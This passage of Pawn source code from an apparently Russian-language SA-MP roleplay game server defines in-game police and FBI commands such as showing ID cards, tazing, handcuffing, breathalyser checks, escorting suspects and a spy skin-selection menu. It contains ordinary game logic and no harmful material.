				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Преступлений: %i",PTEMP[playerid][pCrimes]);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "Законопослушность: %i",PTEMP[playerid][pZakonp]);
				SCM(giveplayerid, COLOR_YELLOW2, string);
				format(string, 128, "=============================");
				SCM(giveplayerid, COLOR_YELLOW, string);
			//	if(PTEMP[playerid][pWantedLevel] > 0) SCM(giveplayerid, COLOR_REDD, " Внимание! Этот человек в розыске!");
				format(string,128, "Показал свой паспорт %s'у",giveplayer);
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, 128, " %s показал(a) свой паспорт", sendername);
				ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
			else
			{
				SCM(playerid, COLOR_GREY, " Вы слишком далеко!");
				return true;
			}
		}
	}
	else
	{
		SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
		return true;
	}
	return true;
}
CMD:showudost(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsACop(playerid)) return true;
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /showudost [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0]) || Spectate[params[0]] == 1) return true;
	new ttext[32];
	if(PTEMP[playerid][pMember] == 0) { ttext = "Гражданин"; }
	else if(PTEMP[playerid][pMember] == 1) { ttext = "Police LS"; }
	else if(PTEMP[playerid][pMember] == 2) { ttext = "FBI"; }
	else if(PTEMP[playerid][pMember] == 10) { ttext = "Police SF"; }
	else if(PTEMP[playerid][pMember] == 21) { ttext = "Plice LV"; }
	new rank = PTEMP[playerid][pRank];
	new level = PTEMP[playerid][pLevel];
	new msg[] = "Имя: %s\nТелефон: %i\nВозвраст: %i\nПодразделение: %s\nРанг: %i";
	format(YCMDstr, sizeof(YCMDstr), msg,Name(playerid),PTEMP[playerid][pPnumber],level,ttext,rank);
	ShowPlayerDialogEx(params[0], 69, DIALOG_STYLE_MSGBOX, "Удостоверение",YCMDstr, "Готово", "");
	format(YCMDstr, sizeof(YCMDstr), " %s показал своё удостоверение %s'у",Name(playerid),Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	format(YCMDstr,sizeof(YCMDstr), " Показал своё удостоверение %s'у",Name(params[0]));
	SetPlayerChatBubble(playerid,YCMDstr,COLOR_PURPLE,30.0,10000);
	return true;
}
CMD:gzcolor(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid,-1, " Введите: /gzcolor [банда]");
	for(new i = 1; i <= TOTALGZ; i++)
	{
		if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
		{
			GZInfo[i][gFrakVlad] = params[0];
			GangZoneStopFlashForAll(GZInfo[i][gZone]);
			GangZoneHideForAll(GZInfo[i][gZone]);
			GangZoneShowForAll(GZInfo[i][gZone],GetGangZoneColor(i));
			UpdateTable(TABLE_GANGZONE,"gang_owner",GZInfo[i][gFrakVlad],"id",GZInfo[i][gID]);
			return true;
		}
	}
	return true;
}
CMD:tazerall(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] != 2 || PTEMP[playerid][pMember] == 2 && PTEMP[playerid][pRank] < 3) return true;
	params[0] = GetClosestforeach(playerid);
	if(!ProxDetectorS(6.0, playerid, params[0])) return SCM(playerid, COLOR_GREY, " Нет никого рядом");
	if(IsPlayerInAnyVehicle(playerid)) return  SCM(playerid, COLOR_GREY, " Невозможно использовать в машине");
	format(YCMDstr, sizeof(YCMDstr), " Агент FBI %s оглушил всех на 15 секунд",Name(playerid));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	TogglePlayerControllable(params[0], 0);
	SetPlayerSpecialAction(params[0],SPECIAL_ACTION_HANDSUP);
	PlayerCuffed[params[0]] = 1;
	PlayerCuffedTime[params[0]] = 15;
	return true;
}
CMD:atazer(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid,-1," Введите: /atazer [1/2/3]");
	if(params[0] == 1)
	{
		format(YCMDstr, sizeof(YCMDstr), " %s оглушил всех",Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				TogglePlayerControllable(i,0);
				SCM(i,-1," Вы заморожены на 10 секунд");
				SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
				SetTimerEx("UnFreeze", 10000, 0, "i", i);
			}
		}
	}
	else if(params[0] == 2)
	{
		format(YCMDstr, sizeof(YCMDstr), " %s оглушил всех рядомстоящих законников",Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				if(PTEMP[i][pMember] == 1 || PTEMP[i][pLeader] == 1 ||PTEMP[i][pMember] == 2 || PTEMP[i][pLeader] == 2 ||PTEMP[i][pMember] == 3 || PTEMP[i][pLeader] == 3)
				{
					TogglePlayerControllable(i,0);
					SCM(i,-1," Вы заморожены на 10 секунд");
					SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
					SetTimerEx("UnFreeze", 10000, 0, "i", i);
				}
			}
		}
	}
	else if(params[0] == 3)
	{
		format(YCMDstr, sizeof(YCMDstr), " %s оглушил всех рядомстоящих жителей", Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				TogglePlayerControllable(i,0);
				SCM(i,-1," Вы заморожены на 10 секунд");
				SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
				SetTimerEx("UnFreeze", 10000, 0, "i", i);
			}
		}
	}
	else return SCM(playerid,COLOR_GREY," Неверное число");
	return true;
}
CMD:ftazer(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] != 2 && PTEMP[playerid][pLeader] != 2) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid,-1," Введите: /ftazer [1/2/3]");
	if(params[0] == 1)
	{
		format(YCMDstr, sizeof(YCMDstr), " Агент FBI %s оглушил всех",Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				TogglePlayerControllable(i,0);
				SCM(i,-1," Вы заморожены на 10 секунд");
				SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
				SetTimerEx("UnFreeze", 10000, 0, "i", i);
			}
		}
	}
	else if(params[0] == 2)
	{
		format(YCMDstr, sizeof(YCMDstr), " Агент FBI %s оглушил всех рядомстоящих законников",Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				if(PTEMP[i][pMember] == 1 || PTEMP[i][pLeader] == 1 ||PTEMP[i][pMember] == 2 || PTEMP[i][pLeader] == 2 ||PTEMP[i][pMember] == 3 || PTEMP[i][pLeader] == 3)
				{
					TogglePlayerControllable(i,0);
					SCM(i,-1," Вы заморожены на 10 секунд");
					SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
					SetTimerEx("UnFreeze", 10000, 0, "i", i);
				}
			}
		}
	}
	else if(params[0] == 3)
	{
		format(YCMDstr, sizeof(YCMDstr), " Агент FBI %s оглушил всех рядомстоящих жителей", Name(playerid));
		ProxDetector(20.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		foreach(i)
		{
			new Float:X,Float:Y,Float:Z;
			GetPlayerPos(playerid,X,Y,Z);
			if(IsPlayerInRangeOfPoint(i,20,X,Y,Z) && i != playerid)
			{
				TogglePlayerControllable(i,0);
				SCM(i,-1," Вы заморожены на 10 секунд");
				SetPlayerSpecialAction(i,SPECIAL_ACTION_HANDSUP);
				SetTimerEx("UnFreeze", 10000, 0, "i", i);
			}
		}
	}
	else return SCM(playerid,COLOR_GREY," Неверное число");
	return true;
}
CMD:tazer(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(IsACop(playerid) && GetPVarInt(playerid, "Fraction_Duty"))
	{
	    if(NewTazer[playerid] == false)
	    {
			NewTazer[playerid] = true;
			SCM(playerid,COLOR_BLUE," Вы поменяли пули на резиновые");
			SCM(playerid,COLOR_BLUE," Для быстрой смены пуль, зажмите клавижу ПРОБЕЛ");
		}
		else
		{
			NewTazer[playerid] = false;
			SCM(playerid,COLOR_BLUE," Вы поменяли пули на обычные");
			SCM(playerid,COLOR_BLUE," Для быстрой смены пуль, зажмите клавижу ПРОБЕЛ");
		}
	} else return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	return true;
}
CMD:itazer(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] != 11 && !GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid,COLOR_GREY," Вам не доступна данная команда");
	else if(PTEMP[playerid][pLeader] != 11) return SCM(playerid,COLOR_GREY," Вам не доступна данная команда");
	if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_GREY, " Невозможно использовать в машине");
	new suspect = GetClosestforeach(playerid);
	if(PlayerCuffed[suspect] > 0) return SCM(playerid, COLOR_GREY, " Игрок уже в наручниках!");
	if(GetDistanceBetweenPlayers(playerid,suspect) < 5)
	{
		if(IsACop(suspect)) return SCM(playerid, COLOR_GREY, " Вы не можете ударить тазером законника");
		if(IsPlayerInAnyVehicle(suspect)) return SCM(playerid, COLOR_GREY, " Человек в машине!");
		format(YCMDstr, sizeof(YCMDstr), " Вас обездвижил электрошокером %s на 15 секунд",Name(playerid));
		SCM(suspect, 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Вы обездвижили электрошокером %s на 15 секунд",Name(suspect));
		SCM(playerid, 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " Инуструктор %s обезвредил %s", Name(playerid) ,Name(suspect));
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		TogglePlayerControllable(suspect, 0);
		SetPlayerSpecialAction(suspect,SPECIAL_ACTION_HANDSUP);
		PlayerCuffed[suspect] = 1;
		PlayerCuffedTime[suspect] = 15;
	}
	return true;
}
CMD:breathalyser(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(PTEMP[playerid][pMember] != 1 || PTEMP[playerid][pLeader] != 1) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: (/bh) /breathalyser [ид]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid, COLOR_GREY, " Необходимо находиться рядом друг с другом");
	new bh[64], patrol[144];
	if(GetPlayerDrunkLevel(params[0]) > 0) format(bh, sizeof(bh), " %s пьяный", PTEMP[params[0]][pName]);
	else format(bh, sizeof(bh), " %s трезвый", PTEMP[params[0]][pName]);
	SCM(playerid, 0x6ab1ffaa, bh), SCM(params[0], 0x6ab1ffaa, bh);
	format(patrol, sizeof(patrol), " Патрульный %s протянул(а) %s алкометр для проверки", PTEMP[playerid][pName], PTEMP[params[0]][pName]);
	ProxDetector(30.0, playerid, patrol, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return true;
}
CMD:follow(playerid,params[])
{
	if(GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 21)
	{
		if(sscanf(params,"d",params[0])) return SCM(playerid,-1, " Введите: /follow [playerid]");
		if(playerid == params[0]) return SCM(playerid, COLOR_GREY, " Нельзя использовать на себе");
		if(!ProxDetectorS(3.0,playerid,params[0]) || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(params[0])) return SCM(playerid,COLOR_GREY, " Необходимо находится рядом друг с другом");
		if(IsPlayerInAnyVehicle(params[0])) return SCM(playerid, COLOR_GREY, " Игрок не должен находиться в автомобиле");
		if(PlayerCuffed[params[0]] != 2) return SCM(playerid, COLOR_GREY, " Игрок должен быть в наручниках");
		new konv = GetPVarInt(playerid, "TempConvoi");
		if(params[0] == konv)
		{
			SetPVarInt(playerid, "TempConvoi", -1);
			Convoi[params[0]] = 9999;
			KillTimer(TimerForPlayer[params[0]]);
			TimerForPlayer[params[0]] = INVALID_PLAYER_ID;
			ClearAnimations(playerid);
			TogglePlayerControllable(params[0], 0);
			return 	GameTextForPlayer(params[0],"~g~unfollow", 5000, 3);
		}
		if(konv != -1) return SCM(playerid, COLOR_GREY, " Вы уже кого-то сопровождаете");
		Convoi[params[0]] = playerid;
		SetPVarInt(playerid, "TempConvoi", params[0]);
		TimerForPlayer[params[0]] = SetTimerEx("ConvoiToPlayer", 250, 1, "i", params[0]);
		GameTextForPlayer(params[0],"~r~follow", 5000, 3);
    }
    return true;
}
CMD:cuff(playerid, params[])
{
	if(GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 21)
	{
		if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /cuff [playerid]");
		if(!IsPlayerConnected(params[0])) return true;
		if(PTEMP[params[0]][pWantedLevel] < 1) return SCM(playerid, COLOR_GREY, " Игрок не находится в розыске");
		if(IsACop(params[0]) && GetPVarInt(params[0], "Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Вы не можете надеть наручники на законника");
		if(PlayerCuffed[params[0]] == 2) return    SCM(playerid, COLOR_GREY, " Игрок уже в наручниках");
		if(!ProxDetectorS(8.0, playerid, params[0])) return true;
		if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Нельзя надеть на себя наручники"); return true; }
		format(YCMDstr, sizeof(YCMDstr), " %s надел вам наручники",Name(playerid));
		SCM(params[0], 0x6495EDFF, YCMDstr);
		GameTextForPlayer(params[0],"~r~cuffed", 5000, 3);
		format(YCMDstr, sizeof(YCMDstr), " Вы надели наручники на %s", Name(params[0]));
		SCM(playerid, 0x6495EDFF, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " %s надел наручники %s",Name(playerid),Name(params[0]));
		SetPlayerAttachedObject(params[0], 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
		SetPlayerSpecialAction(params[0],SPECIAL_ACTION_CUFFED);
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		TogglePlayerControllable(params[0], 0);
		PlayerCuffed[params[0]] = 2;
		PlayerCuffedTime[params[0]] = 3600;
		cuffto[playerid] = params[0];
	}
	return true;
}
CMD:uncuff(playerid, params[])
{
	if(GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 21)
	{
		if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /uncuff [playerid]");
		if(!IsPlayerConnected(params[0])) return true;
		if(IsACop(params[0]) && GetPVarInt(params[0], "Fraction_Duty")) return SCM(playerid, COLOR_GREY, " Вы не можете снять наручники с законника");
		if(PlayerCuffed[params[0]] != 2) return    SCM(playerid, COLOR_GREY, " Игрок не в наручниках");
		if(!ProxDetectorS(8.0, playerid, params[0])) return true;
		if(params[0] == playerid) { SCM(playerid, COLOR_GREY, " Вы не можете снять наручники с самого себя"); return true; }
		GameTextForPlayer(params[0],"~g~uncuffed", 5000, 3);
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли наручники с %s", Name(params[0]));
		SCM(playerid, 0x6495EDFF, YCMDstr);
		TogglePlayerControllable(params[0], 1);
		SetPlayerSpecialAction(params[0],SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(params[0],0);
		PlayerCuffed[params[0]] = 0;
		PlayerCuffedTime[params[0]] = 0;
		cuffto[playerid] = 9999;
	}
	return true;
}
CMD:cput(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pRank] >= 1 && (PTEMP[playerid][pMember] == 1 || PTEMP[playerid][pMember] == 2 || PTEMP[playerid][pMember] == 10 ||PTEMP[playerid][pMember] == 21))
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 596 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 490 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 597 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 598) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Вы не в патрульной машине");
		if(sscanf(params, "u",params[0])) return  SCM(playerid, -1, " Введите: /cput [playerid]");
		if(!IsPlayerConnected(params[0])) return true;
		if(params[0] == INVALID_PLAYER_ID) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек небыл найден");
		if (!ProxDetectorS(5.0, playerid, params[0])) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек далеко от вас");
		if(params[0] == playerid) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Вы не можете затащить в машину самого себя");
		if(!PTEMP[params[0]][pWantedLevel]) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек не является преступником");
		if(GetPlayerState(params[0]) != PLAYER_STATE_ONFOOT) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек в автомобиле");
		new mesto2,vehicle=GetPlayerVehicleID(playerid);
		foreach(i)
		{
			if(IsPlayerInVehicle(i,vehicle))
			{
				mesto2 = GetPlayerVehicleSeat(i);
				if(mesto2==2) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Место в машине уже занято");
			}
		}
		PutPlayerInVehicleEx(params[0],vehicle,1);
		SetPlayerArmedWeapon(params[0],0);
		format(YCMDstr,sizeof(YCMDstr), "Вы были затащены в машину офицером / агентом FBI %s",Name(playerid));
		SCM(params[0],0x64E96EDFF,YCMDstr);
		format(YCMDstr,sizeof(YCMDstr), "Вы затащили в машину преступника %s",Name(params[0]));
		SCM(playerid,0x64E96EDFF,YCMDstr);
	}
	return true;
}
CMD:ceject(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 1 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 2 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 10 || GetPVarInt(playerid,"Fraction_Duty") && PTEMP[playerid][pMember] == 21)
	{
		new giveplayerid,sendername[MAX_PLAYER_NAME],giveplayer[MAX_PLAYER_NAME];
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 596 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 597 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 598 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 490) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Вы не в патрульной машине");
		if(sscanf(params, "u",giveplayerid)) return  SCM(playerid, -1, " Введите: /ceject [playerid]");
		if(!IsPlayerConnected(giveplayerid)) return true;
		if(giveplayerid == INVALID_PLAYER_ID) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек не был найден");
		if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(giveplayerid)) return SCM(playerid, COLOR_GRAD1, "[Ошибка] Человек не в вашей машине");
		RemovePlayerFromVehicle(giveplayerid);
		GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(IsPlayerInRangeOfPoint(giveplayerid,5.0,1568.6144,-1689.9901,6.2188))
		{
			SetPlayerInterior(giveplayerid,6);
			SetPlayerPos(giveplayerid,268.4186,77.6443,1001.0391);
			SetPlayerFacingAngle(giveplayerid, 85.7670);
			format(string,128, " Вы были высажены с машины офицером %s в участок Лос Сантоса",sendername);
			SCM(giveplayerid,0x64E96EDFF,string);
			format(string,128, " Вы высадили подозреваемого %s в полицейский участок Лос Сантоса",giveplayer);
			SCM(playerid,0x64E96EDFF,string);
			format(string,128, " Затолкал(а) подозреваемого %s в полицейский участок",giveplayer);
			SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
		}
		else if(IsPlayerInRangeOfPoint(giveplayerid,5.0,-1594.2096,716.1803,-4.9063))
		{
			SetPlayerInterior(giveplayerid,10);
			SetPlayerPos(giveplayerid,220.1259,114.6476,999.0156);
			SetPlayerFacingAngle(giveplayerid, 95.3400);
			format(string,128, " Вы были высажены с машины офицером %s в участок Сан Фиеро",sendername);
			SCM(giveplayerid,0x64E96EDFF,string);
			format(string,128, " Вы высадили подозреваемого %s в полицейский участок Сан Фиерро",giveplayer);
			SCM(playerid,0x64E96EDFF,string);
			format(string,128, " Затолкал(а) подозреваемого %s в полицейский участок",giveplayer);
			SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
		}
		else if(IsPlayerInRangeOfPoint(giveplayerid,5.0,2297.1138,2451.4346,10.8203))
		{
			SetPlayerInterior(giveplayerid,3);
			SetPlayerVirtualWorld(giveplayerid, 122);
			SetPlayerPos(giveplayerid,198.1339,158.4835,1003.0234);
			SetPlayerFacingAngle(giveplayerid, 354.8164);
			format(string,128, " Вы были высажены с машины офицером %s в участок Лас Вентурас",sendername);
			SCM(giveplayerid,0x64E96EDFF,string);
			format(string,128, " Вы высадили подозреваемого %s в полицейский участок Лас Вентурас",giveplayer);
			SCM(playerid,0x64E96EDFF,string);
			format(string,128, " Затолкал(а) подозреваемого %s в полицейский участок",giveplayer);
			SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
		}
		else
		{
			format(string,128, " Вы были высажены с машины офицером/агентом ФБР %s",sendername);
			SCM(giveplayerid,0x64E96EDFF,string);
			format(string,128, " Вы вытащили с машины подозреваемого %s",giveplayer);
			SCM(playerid,0x64E96EDFF,string);
			format(string,128, " Вытащил(а) из машины подозреваемого %s",giveplayer);
			SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
		}
	}
	return true;
}
CMD:find(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] != 2)return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /find [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " [Ошибка] Вы указали свой ID");
	if(CallInfo[params[0]][callused] == 0 || PhoneOnline[params[0]] > 0) return SCM(playerid,COLOR_GREY," Не удается сойдениться!");
	if(PTEMP[params[0]][pWantedLevel] < 1) return SCM(playerid, COLOR_GREY, " Этот человек не в розыске!");
	{
		SetPlayerCheckpoint(playerid, CallInfo[params[0]][callx],CallInfo[params[0]][cally],CallInfo[params[0]][callz], 6);
		CP[playerid] = 777;
	}
	return true;
}
CMD:spy(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new act[4], fracid,skinid;
	new SmenaSkina;
	if(sscanf(params, "u", SmenaSkina)) return SCM(playerid, -1, " Введите: /spy [ид игрока] {AFAFAF}[on|off] [fractionid] [skinid]");
	if(sscanf(params, "us[4]", SmenaSkina,act))
	{
        SetPVarInt(playerid, "SmenaSkina", SmenaSkina);
		ShowPlayerDialogEx(playerid, 50, DIALOG_STYLE_LIST, "Меню", "[0] Гражданиский\n[1] Полиция\n[2] Армия\n[3] МЧС\n[4] Мэрия\n[5] Автошкола\n[6] News\n[7] LCN\n[8] Yakuza\n[9] Russian Mafia\n[10] Rifa\n[11] Grove street\n[12] Ballas\n[13] Vagos\n[14] Aztec\n[15] Байкеры", "Выбрать", "Назад");
		return true;
    }
    if(sscanf(params, "us[4]d", SmenaSkina, act,fracid))
    {
		if(!strcmp(act, "on", true))
	    {
	        return SCM(playerid, -1, " Введите: /spy [ид игрока] {AFAFAF}[on|off] [fractionid] [skinid]");
	    }
	    else if(!strcmp(act, "off", true))
	    {
	        if(PTEMP[playerid][pMember] != 2) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	        if(PTEMP[playerid][pRank] < 4) return SCM(playerid, COLOR_GREY, " Доступно с 4 ранга");
	        new bool:label=false;
		 	for(new i = 0; i < 5; i++)
			{
				if(spys[i][0] == SmenaSkina)
				{
					label = true;
					spys[i][0] = -1;
					spys[i][1] = -1;
					break;
				}
			}
			if(!label) return SCM(playerid, COLOR_GREY, " Этот человек не шпион!");
	        format(YCMDstr, 80, " %s забрал у %s возможность шпионить", PTEMP[playerid][pName], PTEMP[SmenaSkina][pName]);
			SendFamilyMessage(2, 0x00b953ff, YCMDstr);
			SetPlayerSkin(SmenaSkina, PTEMP[SmenaSkina][pModel]);
			SetPlayerToTeamColor(SmenaSkina);
			return true;
	    }
    }
	if(sscanf(params, "us[4]dd",SmenaSkina, act,fracid,skinid))
	{
        if(!strcmp(act, "off", true))
	    {
	        format(string, sizeof(string), "/spy %i off", SmenaSkina);
	        CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			return true;
	    }
	    if(strcmp(act, "on", true) != 0)
	    {
	        return true;
	    }
	    SetPVarInt(playerid, "SmenaSkina", SmenaSkina);
        switch(fracid)
        {
            case 0: ShowPlayerDialogEx(playerid, 50+1, DIALOG_STYLE_LIST, "Меню", "[0] [skin:79]\n[1] [skin:78]\n[2] [skin:137]\n[3] [skin:200]\n[4] [skin:230]\n[5] [skin:239]\n[6] [skin:212]\n[7] [skin:228]\n[8] [skin:142]\n[9] [skin:297]\n[10] [skin:292]\n[11] [skin:122]\n[12] [skin:193]\n[13] [skin:55]\n[14] [skin:90]\n[15] [skin:40]\n[16] [skin:233]\n[17] [skin:298]\n[18] [skin:93]", "Выбрать", "Назад");
            case 1: ShowPlayerDialogEx(playerid, 50+2, DIALOG_STYLE_LIST, "Меню", "[0] [skin:280]\n[1] [skin:281]\n[2] [skin:282]\n[3] [skin:283]\n[4] [skin:288]\n[5] [skin:284]\n[6] [skin:285]\n[7] [skin:76]\n[8] [skin:306]\n[9] [skin:307]\n[10] [skin:309]\n[11] [skin:265]\n[12] [skin:266]\n[13] [skin:267]\n[14] [skin:310]\n[15] [skin:311]\n[16] [skin:302]\n[17] [skin:303]\n[18] [skin:304]\n[19] [skin:305]", "Выбрать", "Назад");
            case 2: ShowPlayerDialogEx(playerid, 50+3, DIALOG_STYLE_LIST, "Меню", "[0] [skin:287]\n[1] [skin:191]\n[2] [skin:179]", "Выбрать", "Назад");
            case 3: ShowPlayerDialogEx(playerid, 50+4, DIALOG_STYLE_LIST, "Меню", "[0] [skin:274]\n[1] [skin:275]\n[2] [skin:276]\n[3] [skin:70]\n[4] [skin:219]\n[5] [skin:308]", "Выбрать", "Назад");
            case 4: ShowPlayerDialogEx(playerid, 50+5, DIALOG_STYLE_LIST, "Меню", "[0] [skin:57]\n[1] [skin:98]\n[2] [skin:147]\n[3] [skin:187]\n[4] [skin:216]", "Выбрать", "Назад");
